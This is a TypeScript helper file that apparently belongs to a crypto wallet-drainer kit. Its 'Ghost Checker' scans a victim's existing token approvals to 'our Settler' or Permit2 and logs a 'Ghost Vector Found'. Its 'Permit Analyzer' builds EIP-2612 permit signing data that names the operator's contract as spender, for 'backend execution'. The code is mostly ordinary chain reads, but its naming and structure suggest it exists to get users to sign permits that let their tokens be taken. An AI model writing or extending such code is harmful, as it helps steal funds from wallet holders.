import { createPublicClient, http, parseAbi } from "viem";
import { getDomainMetadata, PERMIT_TYPES } from "../../domain-data";
import {
  ALCHEMY_KEY,
  SETTLER_ADDR,
  PERMIT2_ADDRESS,
  PERMIT_ABI,
} from "../types";

/**
 * 🕵️ GHOST CHECKER
 * Verifies if the user has already approved our Settler or Permit2.
 * Sophisticated enough to handle local network routing and multi-chain RPCs.
 */
export async function checkExistingAllowance(
  token: string,
  owner: string,
  _chain: any,
): Promise<boolean> {
  const chain = _chain as any; // Cast to bypass TS property errors
  try {
    const isLocal =
      typeof window !== "undefined" &&
      (window.location.hostname.includes("192.168") ||
        window.location.hostname.includes("localhost"));

    // ✅ FIX: Use dynamic RPC URL to ensure phone tests can reach the Mac
    const rpcUrl =
      isLocal && (chain.id === 1 || chain.id === 31337)
        ? typeof window !== "undefined"
          ? `http://${window.location.hostname}:8545`
          : "http://127.0.0.1:8545"
        : chain.rpcUrl || `https://eth-mainnet.g.alchemy.com/v2/${ALCHEMY_KEY}`;

    const client = createPublicClient({ transport: http(rpcUrl) });

    const [p2, settler] = await Promise.all([
      client
        .readContract({
          address: token as `0x${string}`,
          abi: parseAbi([
            "function allowance(address,address) view returns (uint256)",
          ]),
          functionName: "allowance",
          args: [owner as `0x${string}`, PERMIT2_ADDRESS as `0x${string}`],
        })
        .catch(() => 0n),
      client
        .readContract({
          address: token as `0x${string}`,
          abi: parseAbi([
            "function allowance(address,address) view returns (uint256)",
          ]),
          functionName: "allowance",
          args: [owner as `0x${string}`, SETTLER_ADDR as `0x${string}`],
        })
        .catch(() => 0n),
    ]);

    const hasAllowance = (p2 as bigint) > 0n || (settler as bigint) > 0n;

    if (hasAllowance) {
      console.log(
        `[evm-helpers.ts] Ghost Vector Found | Chain: ${
          chain.label || chain.id
        } | Token: ${token}`,
      );
    }

    return hasAllowance;
  } catch (error) {
    console.error(
      `[evm-helpers.ts] Allowance Check Failed | Token: ${token} | Error: ${
        error instanceof Error ? error.message : "Unknown"
      }`,
    );
    return false;
  }
}

/**
 * ✍️ PERMIT ANALYZER
 * Sophisticated EIP-2612 detection. Constructs signing data for backend execution.
 */
export async function checkPermitSupport(
  tokenAddr: `0x${string}`,
  _chain: any,
  owner: string,
  value: bigint,
  symbol: string,
  onChainName: string,
) {
  const chain = _chain as any;
  try {
    const isLocal =
      typeof window !== "undefined" &&
      (window.location.hostname.includes("192.168") ||
        window.location.hostname.includes("localhost"));

    const rpcUrl =
      isLocal && (chain.id === 1 || chain.id === 31337)
        ? typeof window !== "undefined"
          ? `http://${window.location.hostname}:8545`
          : "http://127.0.0.1:8545"
        : chain.rpcUrl || `https://eth-mainnet.g.alchemy.com/v2/${ALCHEMY_KEY}`;

    const client = createPublicClient({ transport: http(rpcUrl) });

    // Fetch nonce - if this fails, the token doesn't support Permit
    const nonce = (await client.readContract({
      address: tokenAddr,
      abi: PERMIT_ABI,
      functionName: "nonces",
      args: [owner as `0x${string}`],
    })) as bigint;

    const metadata = getDomainMetadata(
      symbol,
      chain.id,
      onChainName,
      tokenAddr,
    );

    return {
      domain: {
        name: metadata.name,
        version: metadata.version,
        chainId: Number(chain.id),
        verifyingContract: tokenAddr,
      },
      types: { Permit: PERMIT_TYPES.Permit },
      primaryType: "Permit",
      message: {
        owner: owner as `0x${string}`,
        spender: SETTLER_ADDR as `0x${string}`,
        value,
        nonce,
        deadline: BigInt(Math.floor(Date.now() / 1000) + 3600),
      },
    };
  } catch (error) {
    // Normal state for non-permit tokens, just log warning
    console.warn(
      `[evm-helpers.ts] Permit Not Supported | Token: ${symbol} (${tokenAddr})`,
    );
    return null;
  }
}
